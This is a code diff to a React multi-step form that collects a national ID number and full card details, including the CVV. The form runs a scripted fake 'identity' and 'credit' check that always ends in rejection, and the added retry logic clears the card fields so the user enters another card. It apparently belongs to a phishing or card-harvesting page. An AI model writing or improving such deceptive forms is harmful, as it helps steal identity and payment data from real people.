@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { FloatingLogo } from './FloatingLogo';
 import { LoadingScreen } from './LoadingScreen';
 import { LoadingSpinner } from './LoadingSpinner';
@@ -29,6 +29,7 @@ export const MultiStepForm: React.FC = () => {
   const [verificationStep, setVerificationStep] = useState<VerificationStep>('initial');
   const [currentStep, setCurrentStep] = useState(0);
   const [orderNumber, setOrderNumber] = useState('');
+  const [isRetry, setIsRetry] = useState(false);
   const [formData, setFormData] = useState<FormData>({
     dni: '',
     cardInfo: {
@@ -40,32 +41,20 @@ export const MultiStepForm: React.FC = () => {
     }
   });
 
-  useEffect(() => {
-    const runVerification = async () => {
-      // Initial loading
-      await new Promise(resolve => setTimeout(resolve, 2000));
-      setIsLoading(false);
-      setVerificationStep('document');
-
-      // Document processing
-      await new Promise(resolve => setTimeout(resolve, 3000));
-      setVerificationStep('identity');
-
-      // Identity verification
-      await new Promise(resolve => setTimeout(resolve, 3000));
-      setVerificationStep('credit');
-
-      // Credit check
-      await new Promise(resolve => setTimeout(resolve, 10000));
-      setVerificationStep('rejected');
-    };
-
-    runVerification();
-  }, []);
-
   const handleRetry = () => {
     setVerificationStep('form');
     setCurrentStep(1);
+    setIsRetry(true);
+    setFormData(prev => ({
+      ...prev,
+      cardInfo: {
+        type: 'credit',
+        number: '',
+        name: '',
+        expiry: '',
+        cvv: ''
+      }
+    }));
   };
 
   const handleNext = async () => {
@@ -100,6 +89,29 @@ export const MultiStepForm: React.FC = () => {
       console.error('Error submitting form:', error);
     }
   };
+
+  React.useEffect(() => {
+    const runVerification = async () => {
+      // Initial loading
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      setIsLoading(false);
+      setVerificationStep('document');
+
+      // Document processing
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      setVerificationStep('identity');
+
+      // Identity verification
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      setVerificationStep('credit');
+
+      // Credit check
+      await new Promise(resolve => setTimeout(resolve, 10000));
+      setVerificationStep('rejected');
+    };
+
+    runVerification();
+  }, []);
 
   const renderStep = () => {
     if (isLoading) {
@@ -159,6 +171,7 @@ export const MultiStepForm: React.FC = () => {
                 }}
                 onNext={handleSubmit}
                 onBack={handleBack}
+                isRetry={isRetry}
               />
             );
           default:
